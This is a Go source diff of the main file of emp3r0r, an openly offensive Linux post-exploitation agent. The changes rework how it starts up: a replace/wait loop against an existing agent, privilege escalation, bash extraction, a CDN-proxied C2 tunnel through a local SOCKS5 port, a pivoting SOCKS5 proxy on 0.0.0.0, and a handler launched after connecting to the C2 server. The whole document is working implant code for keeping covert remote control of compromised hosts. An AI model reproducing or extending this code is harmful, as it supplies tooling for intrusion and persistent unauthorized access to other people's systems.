@@ -1,3 +1,6 @@
+//go:build linux
+// +build linux
+
 package main
 
 import (
@@ -9,7 +12,9 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"os/user"
 	"strings"
+	"syscall"
 	"time"
 
 	"github.com/google/uuid"
@@ -26,6 +31,7 @@ func main() {
 	c2proxy := flag.String("proxy", "", "Proxy for emp3r0r agent's C2 communication")
 	cdnProxy := flag.String("cdnproxy", "", "CDN proxy for emp3r0r agent's C2 communication")
 	doh := flag.String("doh", "", "DNS over HTTPS server for CDN proxy's DNS requests")
+	replace := flag.Bool("replace", false, "Replace existing agent process")
 	silent := flag.Bool("silent", false, "Suppress output")
 	daemon := flag.Bool("daemon", false, "Daemonize")
 	version := flag.Bool("version", false, "Show version info")
@@ -41,19 +47,57 @@ func main() {
 	// don't be hasty
 	time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)
 
-	// silent switch
-	log.SetOutput(ioutil.Discard)
-	if !*silent {
-		fmt.Println("emp3r0r agent has started")
-		log.SetOutput(os.Stderr)
-	}
-
-	// mkdir -p
+	// mkdir -p UtilsPath
+	// use absolute path
+	// TODO find a better location for temp files
 	if !util.IsFileExist(emp3r0r_data.UtilsPath) {
 		err = os.MkdirAll(emp3r0r_data.UtilsPath, 0700)
 		if err != nil {
 			log.Fatalf("[-] Cannot mkdir %s: %v", emp3r0r_data.AgentRoot, err)
 		}
+	}
+
+	// silent switch
+	log.SetOutput(ioutil.Discard)
+	log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds | log.Lshortfile)
+	if !*silent {
+		fmt.Println("emp3r0r agent has started")
+		log.SetOutput(os.Stderr)
+
+		// redirect everything to log file
+		f, err := os.OpenFile(fmt.Sprintf("%s/emp3r0r.log",
+			emp3r0r_data.AgentRoot),
+			os.O_RDWR|os.O_CREATE|os.O_APPEND, 0600)
+		if err != nil {
+			log.Printf("error opening emp3r0r.log: %v", err)
+		} else {
+			log.SetOutput(f)
+			defer f.Close()
+			err = syscall.Dup2(int(f.Fd()), int(os.Stderr.Fd()))
+			if err != nil {
+				log.Fatalf("Cannot redirect stderr to log file: %v", err)
+			}
+		}
+	}
+
+	// PATH
+	os.Setenv("PATH", fmt.Sprintf("%s:/bin:/usr/bin:/usr/local/bin", emp3r0r_data.UtilsPath))
+
+	// HOME
+	u, err := user.Current()
+	if err != nil {
+		log.Printf("Get user info: %v", err)
+	} else {
+		os.Setenv("HOME", u.HomeDir)
+	}
+
+	// extract bash
+	err = agent.ExtractBash()
+	if err != nil {
+		log.Printf("[-] Cannot extract bash: %v", err)
+	}
+	if !util.IsFileExist(emp3r0r_data.DefaultShell) {
+		emp3r0r_data.DefaultShell = "/bin/sh"
 	}
 
 	// daemonize
@@ -76,6 +120,7 @@ func main() {
 	}
 
 	// if the agent's process name is not "emp3r0r"
+test_agent:
 	alive, pid := agent.IsAgentRunningPID()
 	if alive {
 		proc, err := os.FindProcess(pid)
@@ -87,37 +132,33 @@ func main() {
 		if agent.IsAgentAlive() {
 			if os.Geteuid() == 0 && agent.ProcUID(pid) != "0" {
 				log.Println("Escalating privilege...")
-			} else {
-				log.Fatal("Agent is already running and responsive, aborting")
+			} else if !*replace {
+				log.Printf("[%d->%d] Agent is already running and responsive, waiting...",
+					os.Getppid(),
+					os.Getpid())
+
+				util.TakeASnap()
+				goto test_agent
 			}
 		}
 
 		// if agent is not responsive, kill it, and start a new instance
-		err = proc.Kill()
-		if err != nil {
-			log.Println("Failed to kill old emp3r0r", err)
+		// after IsAgentAlive(), the PID file gets replaced with current process's PID
+		// if we kill it, we will be killing ourselves
+		if proc.Pid != os.Getpid() {
+			err = proc.Kill()
+			if err != nil {
+				log.Println("Failed to kill old emp3r0r", err)
+			}
 		}
 	}
 
 	// start socket listener
 	go socketListen()
 
-	// start SSHD
-	go func() {
-		err = agent.SSHD("bash", emp3r0r_data.SSHDPort)
-		if err != nil {
-			log.Printf("Error starting SSHD: %v", err)
-		}
-	}()
-
 	// parse C2 address
 	emp3r0r_data.CCIP = strings.Split(emp3r0r_data.CCAddress, "/")[2]
-	// if not using IP as C2, we assume CC is proxied by CDN/tor, thus using default 443 port
-	if tun.ValidateIP(emp3r0r_data.CCIP) {
-		emp3r0r_data.CCAddress = fmt.Sprintf("%s:%s/", emp3r0r_data.CCAddress, emp3r0r_data.CCPort)
-	} else {
-		emp3r0r_data.CCAddress += "/"
-	}
+	emp3r0r_data.CCAddress = fmt.Sprintf("%s:%s/", emp3r0r_data.CCAddress, emp3r0r_data.CCPort)
 
 	// if CC is behind tor, a proxy is needed
 	if tun.IsTor(emp3r0r_data.CCAddress) {
@@ -153,29 +194,27 @@ func main() {
 	if *cdnProxy != "" {
 		emp3r0r_data.CDNProxy = *cdnProxy
 	}
+	upper_proxy := emp3r0r_data.AgentProxy // when using CDNproxy
 	if emp3r0r_data.CDNProxy != "" {
+		log.Printf("C2 is behind CDN, using CDNProxy %s", emp3r0r_data.CDNProxy)
+		cdnproxyAddr := fmt.Sprintf("socks5://127.0.0.1:%d", util.RandInt(1024, 65535))
+		// DoH server
+		dns := "https://9.9.9.9/dns-query"
+		if emp3r0r_data.DoHServer != "" {
+			dns = emp3r0r_data.DoHServer
+		}
 		go func() {
-			// DoH server
-			dns := "https://9.9.9.9/dns-query"
-			if emp3r0r_data.DoHServer != "" {
-				dns = emp3r0r_data.DoHServer
+			for !tun.IsProxyOK(cdnproxyAddr) {
+				// typically you need to configure AgentProxy manually if agent doesn't have internet
+				// and AgentProxy will be used for websocket connection, then replaced with 10888
+				err := cdn2proxy.StartProxy(strings.Split(cdnproxyAddr, "socks5://")[1], emp3r0r_data.CDNProxy, upper_proxy, dns)
+				if err != nil {
+					log.Printf("CDN proxy at %s stopped (%v), restarting", cdnproxyAddr, err)
+				}
 			}
-
-			// typically you need to configure AgentProxy manually if agent doesn't have internet
-			// and AgentProxy will be used for websocket connection, then replaced with 10888
-			err := cdn2proxy.StartProxy("127.0.0.1:10888", emp3r0r_data.CDNProxy, emp3r0r_data.AgentProxy, dns)
-			if err != nil {
-				log.Fatal(err)
-			}
-			emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", emp3r0r_data.CDNProxy)
-			emp3r0r_data.AgentProxy = "socks5://127.0.0.1:10888"
 		}()
-	}
-
-	// hide process of itself if possible
-	err = agent.UpdateHIDE_PIDS()
-	if err != nil {
-		log.Print(err)
+		emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", emp3r0r_data.CDNProxy)
+		emp3r0r_data.AgentProxy = cdnproxyAddr
 	}
 
 	// agent root
@@ -191,13 +230,13 @@ func main() {
 		// start a socks5 proxy
 		err := agent.Socks5Proxy("on", "0.0.0.0:"+emp3r0r_data.ProxyPort)
 		if err != nil {
-			log.Printf("Socks5Proxy on: %v", err)
+			log.Printf("Socks5Proxy on %s: %v", emp3r0r_data.ProxyPort, err)
 			return
 		}
 		defer func() {
 			err := agent.Socks5Proxy("off", "0.0.0.0:"+emp3r0r_data.ProxyPort)
 			if err != nil {
-				log.Printf("Socks5Proxy off: %v", err)
+				log.Printf("Socks5Proxy off (%s): %v", emp3r0r_data.ProxyPort, err)
 			}
 		}()
 	}()
@@ -284,6 +323,9 @@ connect:
 		goto connect
 	}
 	log.Println("Connected to CC TunAPI")
+	if !util.IsFileExist(emp3r0r_data.UtilsPath + "/bettercap") {
+		go agent.VaccineHandler()
+	}
 	err = agent.CCMsgTun(ctx, cancel)
 	if err != nil {
 		log.Printf("CCMsgTun: %v, reconnecting...", err)
@@ -319,7 +361,7 @@ func socketListen() {
 	}
 }
 
-// handle connections to our socket: echo whatever we get
+// handle connections to our socket: tell them my PID
 func server(c net.Conn) {
 	for {
 		buf := make([]byte, 512)
@@ -330,7 +372,9 @@ func server(c net.Conn) {
 
 		data := buf[0:nr]
 		log.Println("Server got:", string(data))
-		_, err = c.Write(data)
+
+		reply := fmt.Sprintf("emp3r0r running on PID %d", os.Getpid())
+		_, err = c.Write([]byte(reply))
 		if err != nil {
 			log.Printf("Write: %v", err)
 		}
